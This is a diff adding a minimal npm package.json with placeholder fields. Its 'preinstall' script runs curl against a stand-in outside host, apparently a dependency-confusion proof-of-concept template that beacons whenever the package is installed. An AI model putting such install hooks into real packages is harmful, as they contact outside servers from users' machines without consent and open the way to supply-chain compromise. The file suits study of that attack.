@@ -1,0 +1,12 @@
+{
+  "name": "your-module-name",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "curl http://yoursite.co.m"
+  },
+  "author": "0xsapra",
+  "license": "ISC"
+}
